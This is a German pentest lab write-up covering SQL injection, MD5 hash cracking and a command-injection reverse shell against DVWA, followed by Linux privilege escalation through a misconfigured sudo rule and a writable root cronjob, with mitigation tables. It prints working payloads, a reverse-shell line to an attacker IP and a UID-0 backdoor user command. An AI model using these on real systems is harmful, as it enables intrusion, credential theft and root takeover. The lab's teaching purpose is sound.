# Kapitel 1: Web-Exploitation gegen DVWA

Ausgangspunkt dieses Kapitels ist das absichtlich verwundbare DVWA (Damn Vulnerable Web Application), das auf dem Ubuntu-Server in Docker läuft (`192.168.10.20:8080`). Ziel war es, von reiner Webapp-Interaktion bis zu einer vollwertigen Shell auf dem zugrunde liegenden System zu kommen.

## Reconnaissance

Erster Schritt jedes Pentests: herausfinden, welche Dienste überhaupt erreichbar sind.

```bash
nmap -sV 192.168.10.20
```

Ergebnis: offene Ports für nginx (80), den DVWA-Container (8080, Apache/PHP), Juice Shop (3000) sowie den Mailserver (Postfix/Dovecot, 25/110/143/993/995). Die Versionserkennung (`-sV`) ist eine Heuristik und kann sich irren (z. B. bei Node.js-Anwendungen wie Juice Shop), sollte also nie blind übernommen, sondern manuell verifiziert werden.

## Technik 1: SQL Injection (DVWA, Security Level Low)

**Schwachstelle:** Nutzereingaben werden ungefiltert in eine SQL-Abfrage eingebaut:

```sql
SELECT * FROM users WHERE id = 'EINGABE';
```

**Nachweis der Lücke:** Ein einzelnes Anführungszeichen (`'`) als Eingabe erzeugt einen Datenbankfehler — Beweis, dass die Eingabe direkt in die Abfrage eingesetzt wird.

**Ausnutzung — Bedingung immer wahr machen:**
```
2' OR 1=1 -- 
```
Setzt man den Payload in die Abfrage ein, matcht die WHERE-Klausel jede Zeile der Tabelle (`OR 1=1` ist immer wahr), die Anwendung gibt alle Nutzer statt nur eines einzelnen zurück.

**Spaltenanzahl ermitteln (für UNION-based SQLi):**
```
2' ORDER BY 1 -- 
2' ORDER BY 2 -- 
2' ORDER BY 3 --    → Fehler "Unknown column 3"
```
→ Die Abfrage liefert 2 Spalten.

**Daten aus anderen Tabellen extrahieren (UNION-based SQLi):**
```
' UNION SELECT user, password FROM users -- 
```
Die zwei Platzhalter-Spalten der ursprünglichen Abfrage werden durch Login-Name und Passwort-Hash aus der `users`-Tabelle ersetzt — die Anwendung zeigt diese an derselben Stelle an wie normale Vor-/Nachnamen, ohne zu wissen, dass es keine echten Namen sind.

**Robustheit der Security-Level getestet:** Bei "Medium" wird die freie Texteingabe durch ein Dropdown ersetzt — eine rein clientseitige Einschränkung, die sich mit einem Proxy (z. B. Burp Suite) umgehen lässt, da der eigentliche Server-Request unverändert bleibt. Bei "High" griff derselbe Payload trotz zusätzlicher serverseitiger Filter weiterhin, ein Beispiel für unvollständiges Escaping als Schutzmaßnahme.

## Hash-Cracking

Die extrahierten Passwort-Hashes wurden identifiziert und offline geknackt.

```bash
hash-identifier          # Hash-Typ bestimmen → MD5
hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Alle vier extrahierten Hashes wurden in Sekunden geknackt (MD5 ist ungesalzen und sehr schnell berechenbar, daher für Passwort-Hashing ungeeignet). Zwei Nutzer hatten identische Hashes — und damit identische (schwache) Passwörter, erkennbar bereits am Vergleich der Rohdaten vor dem Cracken.

**Proof of Concept:** Login mit einem der geknackten Credential-Paare über die reguläre DVWA-Login-Maske bestätigt die vollständige Kompromittierung des Nutzerkontos.

## Technik 2: Command Injection → Reverse Shell

**Schwachstelle:** Eine Ping-Funktion übergibt die Nutzereingabe ungefiltert an einen Shell-Befehl:

```bash
ping -c 4 EINGABE
```

**Nachweis:** Verkettung mit `&&` führt einen zweiten, eigenen Befehl aus:
```
127.0.0.1 && ls
```

**Reverse Shell:** Ziel ist eine interaktive Verbindung vom Server zurück zum Angreifer-System, statt einzelner Einmal-Befehle.

```bash
# Auf Kali (Listener):
nc -lvnp 4444

# Payload im DVWA-Formular:
127.0.0.1 && bash -c 'bash -i >& /dev/tcp/192.168.20.10/4444 0>&1'
```

**Stolperstein:** Der erste Versuch ohne `bash -c` schlug fehl, da PHP Shell-Befehle über `/bin/sh` ausführt — auf Debian/Ubuntu standardmäßig `dash`, nicht `bash`. `dash` kennt die Bash-spezifische `/dev/tcp/`-Umleitung nicht und bricht den Befehl lautlos ab. Die Lösung: `bash` explizit mit `-c` aufrufen, damit die Umleitung von Bash selbst (nicht von der äußeren dash-Shell) interpretiert wird.

**Ergebnis:** Interaktive Shell als `www-data` auf dem Zielsystem — Zugriff auf `/root/` wird korrekt mit „Permission denied“ verweigert (Ausgangspunkt für Kapitel 2, Privilege Escalation).

## Kill Chain im Überblick

```
Reconnaissance (nmap) 
→ SQL Injection → Credential-Diebstahl (Hash-Extraktion + Cracking)
→ Command Injection → Reverse Shell (www-data-Zugriff)
```

## Mitigation

| Schwachstelle | Gegenmaßnahme |
|---|---|
| SQL Injection | Prepared Statements / parametrisierte Queries statt String-Konkatenation |
| Schwaches Passwort-Hashing (MD5) | bcrypt, scrypt oder Argon2 mit Salt |
| Unzureichende clientseitige Filter (Dropdown) | Validierung grundsätzlich serverseitig, nie nur im Frontend |
| Command Injection | Keine Nutzereingaben an Shell-Befehle übergeben; wo unvermeidbar, strikte Allow-Lists statt Blacklist-Filterung, Escaping über Sprachfunktionen statt eigener Logik |

# Kapitel 2: Privilege Escalation auf Ubuntu Server

Nach dem initialen Zugriff über eine Webapp-Schwachstelle (siehe Kapitel 1) stand nur ein eingeschränkter Shell-Zugang zur Verfügung (`www-data`, Rechte eines Webserver-Prozesses). Dieses Kapitel dokumentiert drei typische Wege, von einem niedrig privilegierten Account zu Root-Rechten zu eskalieren — zwei davon bewusst nachgebaute, realistische Fehlkonfigurationen auf dem Ubuntu-Zielsystem.

## Ziel

Zeigen, wie häufige Admin-Fehler (zu weitreichende `sudo`-Rechte, unsichere Dateiberechtigungen bei automatisierten Skripten) zur vollständigen Kompromittierung eines Systems führen — und welche systematische Vorgehensweise (Enumeration) dorthin führt.

## Vorgehen: Enumeration

Vor jeder Ausnutzung steht die systematische Bestandsaufnahme mit niedrigen Rechten:

```bash
find / -perm -4000 -type f 2>/dev/null    # SUID-Binaries auflisten
sudo -l                                   # eigene Sudo-Rechte prüfen
cat /etc/crontab; ls -la /etc/cron.d/     # Cronjobs auf Automatisierungsfehler prüfen
```

**Ergebnis der SUID-Prüfung:** Nur Standard-Binaries (`passwd`, `su`, `mount`, `ping` etc.), keine ausnutzbare Lücke — ein valides, dokumentationswürdiges Negativergebnis.

## Technik 1: Fehlkonfigurierte Sudo-Rechte (GTFOBins)

**Simulierte Fehlkonfiguration:** Ein eingeschränkter Nutzer (`lowpriv`) durfte ohne Passwort das Tool `find` mit `sudo` ausführen:

```
lowpriv ALL=(ALL) NOPASSWD: /usr/bin/find
```

**Ausnutzung:** `find` bietet die Funktion `-exec`, um nach der Dateisuche beliebige weitere Befehle auszuführen. Diese Befehle erben die Rechte, mit denen `find` selbst läuft — hier also Root:

```bash
sudo find . -exec /bin/bash \;
```

Ergebnis: sofortige interaktive Root-Shell.

**Kernprinzip:** Nicht `find` selbst ist gefährlich, sondern dass es Mechanismen besitzt, um beliebige weitere Programme zu starten. Diese Eigenschaft teilen sich hunderte gängige Unix-Tools (Editoren, Interpreter, Archiv-Programme) — dokumentiert in der [GTFOBins](https://gtfobins.github.io/)-Datenbank. Jede `sudo`-Freigabe eines Tools mit solchen Fähigkeiten ist faktisch eine Freigabe einer Root-Shell.

## Technik 2: Unsichere Dateirechte bei einem Root-Cronjob

**Simulierte Fehlkonfiguration:** Ein Cronjob führt minütlich als `root` ein Wartungsskript aus, das versehentlich für alle Nutzer beschreibbar ist:

```
# /etc/cron.d/backup-cleanup
* * * * * root /opt/scripts/cleanup.sh
```
```bash
sudo chmod 777 /opt/scripts/cleanup.sh
```

**Ausnutzung:** Da jeder Nutzer das Skript beschreiben kann, es aber mit Root-Rechten ausgeführt wird, reicht es, eigenen Code anzuhängen. Zwei Varianten wurden getestet:

- *SUID-Kopie von Bash* — auf diesem (gehärteten) System wirkungslos, da moderne Bash-Builds das SUID-Bit für sich selbst ignorieren.
- *Anlegen eines neuen Root-Nutzers* — zuverlässig erfolgreich:

```bash
useradd -o -u 0 -g root mia
echo "mia:123456" | chpasswd
```

Da unter Linux nicht der Nutzername, sondern die UID über Rechte entscheidet, verschafft ein zweiter Nutzer mit UID 0 denselben Zugriff wie `root`, komplett ohne SUID-Trick.

**Kernprinzip:** Automatisierung mit erhöhten Rechten ist nur so sicher wie die Dateiberechtigungen der ausgeführten Skripte selbst. `chmod 777` als schnelle Lösung für Berechtigungsprobleme ist einer der häufigsten real auftretenden Fehler in produktiven Systemen.

## Gemeinsames Prinzip beider Techniken

In beiden Fällen bekommt ein Prozess oder Nutzer mit eingeschränkten Rechten indirekt die Möglichkeit, Code mit **höheren Rechten als beabsichtigt** auszuführen — einmal durch zu großzügige Rechtevergabe (`sudo`), einmal durch zu laxe Dateiberechtigungen bei einem bereits privilegierten Automatisierungsprozess (Cronjob). Beides sind Verstöße gegen das **Least-Privilege-Prinzip**.

## Mitigation

| Fehler | Gegenmaßnahme |
|---|---|
| `sudo`-Freigabe mächtiger Tools (`find`, `vim`, `less`, `awk`, …) | Nur exakt benötigte, möglichst spezifische Skripte statt generischer Tools freigeben; Argumente in der sudoers-Regel einschränken |
| Weltweit beschreibbare Skripte für Root-Cronjobs | Skripte nur für `root` beschreibbar machen (`chmod 700` o. ä.), niemals `777` als Standardlösung für Berechtigungsfehler nutzen |
| Fehlende Kontrolle über vergebene Rechte | Regelmäßige Audits mit `sudo -l`, `find / -perm -4000`, `find / -perm -2 -type f` auf allen produktiven Systemen |

## Tools für die systematische Suche

In der Praxis werden diese Schritte meist mit automatisierten Enumeration-Skripten beschleunigt (z. B. **LinPEAS**, **LinEnum**), die genau nach diesen Mustern suchen. Für dieses Lab wurde bewusst manuell vorgegangen, um das zugrunde liegende Prinzip zu verstehen, bevor man sich auf Automatisierung verlässt.

